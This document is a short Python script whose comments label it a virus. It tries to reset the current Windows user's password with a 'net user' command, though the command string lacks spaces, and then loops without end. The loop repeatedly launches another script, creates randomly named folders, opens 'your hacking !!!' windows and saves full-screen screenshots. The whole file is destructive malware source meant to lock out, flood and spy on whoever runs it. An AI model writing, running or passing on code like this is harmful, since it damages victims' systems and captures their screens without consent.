import os
import random
from tkinter import *
from PIL import ImageGrab




#Change device password
user = os.environ['USERNAME']
code = 'net user' + user + 'yourhacking!!!@#$$##%$ytyt766'#<password
os.system(code)











#Virus start
while True:
    try:
        os.startfile("b.py")
    except:
        pass


    try:
        name = str(random.randrange(1234567890904903756))
        os.system(f'mkdir {name}')
    except:
        pass


    #Build window
    try:
        window = Tk()
        window.title('your hacking !!!')
        window.minsize(900,800)
        window.maxsize(900,800)
        Button(window, text='your hacking !!!').pack()
        window.mainloop()
    except:
        pass

    #Take screenshots of the page and save a lot
    try:
        nam = str(random.randrange(123456768677890))
        sc = ImageGrab.grab()
        sc.save(nam + '.png')
    except:
        pass
